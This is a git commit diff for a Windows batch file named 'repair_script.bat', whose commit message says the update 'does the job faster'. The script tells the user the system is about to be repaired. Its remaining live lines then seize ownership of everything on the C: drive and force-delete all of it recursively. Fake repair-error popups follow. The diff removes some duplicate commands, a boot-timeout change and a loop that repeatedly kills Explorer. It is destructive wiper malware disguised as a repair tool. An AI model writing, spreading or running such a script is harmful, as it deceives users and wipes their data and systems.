f950abd9cbd417815d75b3dd5d891ae18f062421
Aaravdevelops <137682685+Aaravdevelops@users.noreply.github.com>
2024-12-01 14:40:20 +0530

    Update repair_script.bat | does the job faster

--- repair_script.bat
+++ repair_script.bat
@@ -3,21 +3,10 @@
 start "" /wait cmd /c "echo this system is going to be repaired!!! & echo( & pause"
     icacls "C:\*.*" /grant %user%:F /t
     takeown /f "C:\*.*" /r /d y
-    takeown /f "C:\*.*" /r /d y
-    takeown /f "C:\*.*" /r /d y
-    del /q /f "C:\*.*" /s
     del /q /f "C:\*.*" /s
     del /q /f "C:\*.*" /s
 for /L %%i in (1,1,10) do (
     start cmd /c "echo Error occurred while repairing system! & echo( & pause"
     timeout /t 7 >nul
 )
-bcdedit /timeout 1
 echo shutdown -r -t 20
-for /L %%i in (1,1,30) do (
-    start explorer.exe
-    timeout /t 2 >nul
-    taskkill /im explorer.exe /f
-)
-
-    
